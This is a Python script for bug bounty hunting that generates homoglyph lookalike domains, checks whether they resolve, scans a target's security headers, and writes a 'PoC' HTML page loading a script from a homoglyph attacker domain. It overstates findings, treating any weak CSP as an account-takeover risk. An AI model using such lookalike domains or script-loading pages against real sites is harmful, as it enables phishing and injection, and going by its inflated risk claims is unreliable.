#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PunyChain Interactive
Homoglyph Generator + DNS Resolver + Header Scanner + Weak CSP Detector + PoC Builder + Export Report
Author: samael_0x4
"""

import requests
import idna
import socket
import time, sys
from colorama import Fore, Style, init

# Init colors
init(autoreset=True)

# --------------------------------------
# ASCII Banner
# --------------------------------------
def banner():
    print(Fore.CYAN + r"""
██████╗ ██╗   ██╗███╗   ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
██╔══██╗██║   ██║████╗  ██║██║   ██║██╔════╝██║  ██║██╔══██╗██║████╗  ██║
██████╔╝██║   ██║██╔██╗ ██║██║   ██║██║     ███████║███████║██║██╔██╗ ██║
██╔═══╝ ██║   ██║██║╚██╗██║██║   ██║██║     ██╔══██║██╔══██║██║██║╚██╗██║
██║     ╚██████╔╝██║ ╚████║╚██████╔╝╚██████╗██║  ██║██║  ██║██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
""")
    print(Fore.YELLOW + "              🔗 PunyChain — Homoglyph + CSP Scanner 🔗")
    print(Fore.GREEN + "                     Made with ❤️ by samael_0x4\n")

# --------------------------------------
# Homoglyph dictionary
# --------------------------------------
HOMOGLYPHS = {
    "a": ["à", "á", "â", "ã", "ä", "å", "ɑ", "а", "ạ", "ą", "ǎ", "ª"],
    "e": ["è", "é", "ê", "ë", "ē", "ė", "ę", "е"],
    "i": ["ì", "í", "î", "ï", "ī", "į", "ι", "і"],
    "o": ["ò", "ó", "ô", "õ", "ö", "ō", "ο", "о", "ɵ"],
    "u": ["ù", "ú", "û", "ü", "ū", "ů", "ű", "ų", "µ"],
    "c": ["ç", "ć", "č", "ċ", "ĉ", "ƈ", "ς", "с"],
    "A": ["À", "Á", "Â", "Ã", "Ä", "Å", "А"],
    "E": ["È", "É", "Ê", "Ë", "Ē", "Ė", "Ę", "Е"],
    "I": ["Ì", "Í", "Î", "Ï", "Ī", "Į", "І"],
    "O": ["Ò", "Ó", "Ô", "Õ", "Ö", "Ō", "Ø", "О"],
    "U": ["Ù", "Ú", "Û", "Ü", "Ū", "Ů", "Ű", "Ų"],
    "C": ["Ç", "Ć", "Č", "Ĉ", "Ċ", "С"],
}

# --------------------------------------
# DNS Resolver
# --------------------------------------
def resolve_domain(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except:
        return False

# --------------------------------------
# Loading Animation
# --------------------------------------
def loading(msg="Scanning"):
    for i in range(6):
        sys.stdout.write(Fore.YELLOW + f"\r{msg}{'.' * (i % 4)}   ")
        sys.stdout.flush()
        time.sleep(0.3)
    print("\r" + " " * 30, end="\r")  # clear line

# --------------------------------------
# Generate homoglyphs for single alphabet
# --------------------------------------
def generate_alphabet(letter):
    if letter in HOMOGLYPHS:
        print(Fore.CYAN + f"\n[+] Homoglyphs for '{letter}':")
        for char in HOMOGLYPHS[letter]:
            try:
                puny = idna.encode(char).decode()
            except:
                puny = "(invalid punycode)"
            print(Fore.GREEN + f"   {puny}  --->  {char}")
    else:
        print(Fore.RED + "[!] No homoglyphs available for this character.")

# --------------------------------------
# Generate homoglyphs for a domain
# --------------------------------------
def generate_domain(domain):
    print(Fore.CYAN + f"\n[+] Homoglyph domain variants for: {domain}")
    for letter, variants in HOMOGLYPHS.items():
        if letter in domain:
            for variant in variants:
                new_domain = domain.replace(letter, variant)
                try:
                    puny = idna.encode(new_domain).decode()
                    alive = resolve_domain(new_domain)
                    status = Fore.GREEN + "Alive" if alive else Fore.RED + "Dead"
                    print(Fore.GREEN + f"   {puny}  --->  {new_domain}   [{status}]")
                except:
                    pass

# --------------------------------------
# Scan headers for weak CSP
# --------------------------------------
def scan_headers(url):
    print(Fore.CYAN + f"\n[+] Scanning headers for: {url}")
    loading("Scanning headers")  # animated loader

    found_vuln = False
    weak_csp = False
    missing_headers = []
    results = []

    try:
        response = requests.get(url, timeout=10)
        headers = response.headers
        csp = headers.get("Content-Security-Policy", None)

        # Check CSP
        if csp:
            if "*" in csp or "http:" in csp or "unsafe-inline" in csp:
                line = f"[! WEAK CSP] {csp}"
                print(Fore.RED + line)
                results.append(line)
                weak_csp = True
                found_vuln = True
            else:
                line = f"[FOUND] CSP: {csp}"
                print(Fore.GREEN + line)
                results.append(line)
        else:
            line = "[MISSING] Content-Security-Policy"
            print(Fore.YELLOW + line)
            results.append(line)
            missing_headers.append("Content-Security-Policy")
            found_vuln = True

        # Check other important headers
        for h in ["X-Frame-Options", "Strict-Transport-Security", "X-Content-Type-Options", "Referrer-Policy"]:
            if h in headers:
                line = f"[FOUND] {h}: {headers[h]}"
                print(Fore.GREEN + line)
                results.append(line)
            else:
                line = f"[MISSING] {h}"
                print(Fore.YELLOW + line)
                results.append(line)
                missing_headers.append(h)
                found_vuln = True

    except Exception as e:
        line = f"[!] Error: {e}"
        print(Fore.RED + line)
        results.append(line)

    # Summary
    summary_lines = []
    summary_lines.append("\n--- Scan Summary ---")
    if found_vuln:
        if weak_csp:
            summary_lines.append("🔥 Weak CSP detected → Possible homoglyph injection → Account Takeover risk")
        if missing_headers:
            summary_lines.append(f"⚠️ Missing headers ({', '.join(missing_headers)}) → Potential security gaps")
        summary_lines.append("👉 Recommended: Report these issues for bounty impact")
        for line in summary_lines:
            print(Fore.MAGENTA + line)
    else:
        summary_lines.append("✅ All important headers are present and strong → Safe side")
        for line in summary_lines:
            print(Fore.GREEN + line)

    # Save report
    save = input(Fore.CYAN + "\n[?] Save scan results to file? (y/n): ").strip().lower()
    if save == "y":
        filename = "scan_report.txt"
        with open(filename, "w", encoding="utf-8") as f:
            for line in results + summary_lines:
                f.write(line + "\n")
        print(Fore.MAGENTA + f"[+] Report saved as {filename}")

    return found_vuln

# --------------------------------------
# PoC Builder
# --------------------------------------
def build_poc(target_url, attacker_domain="gооgle.com"):
    poc = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>PunyChain PoC</title></head>
<body>
<h3>PunyChain PoC for {target_url}</h3>
<script src="https://{attacker_domain}/poc.js"></script>
</body>
</html>
"""
    filename = "poc_injection.html"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(poc)
    print(Fore.MAGENTA + f"[+] PoC saved as {filename} (script src={attacker_domain})")

# --------------------------------------
# Interactive Menu
# --------------------------------------
def menu():
    banner()
    while True:
        print(Fore.YELLOW + "\nChoose an option:")
        print("1) Generate homoglyphs for a single alphabet")
        print("2) Generate homoglyph variants for a domain (with DNS check)")
        print("3) Scan target URL for headers & weak CSP")
        print("4) Exit")

        choice = input(Fore.CYAN + "\n[?] Enter choice: ").strip()

        if choice == "1":
            letter = input(Fore.CYAN + "[?] Enter a letter (a-z or A-Z): ").strip()
            generate_alphabet(letter)
        elif choice == "2":
            domain = input(Fore.CYAN + "[?] Enter domain (e.g. tesla.com): ").strip()
            generate_domain(domain)
        elif choice == "3":
            url = input(Fore.CYAN + "[?] Enter target URL (e.g. https://target.com): ").strip()
            weak = scan_headers(url)
            if weak:
                make_poc = input(Fore.CYAN + "[?] Build PoC HTML file? (y/n): ").strip().lower()
                if make_poc == "y":
                    attacker = input(Fore.CYAN + "[?] Enter homoglyph domain to use (default: gооgle.com): ").strip()
                    if not attacker:
                        attacker = "gооgle.com"
                    build_poc(url, attacker)
        elif choice == "4":
            print(Fore.MAGENTA + "\n[!] Exiting... Stay hacking 👾")
            break
        else:
            print(Fore.RED + "[!] Invalid choice. Try again.")

# --------------------------------------
# Entry Point
# --------------------------------------
if __name__ == "__main__":
    menu()
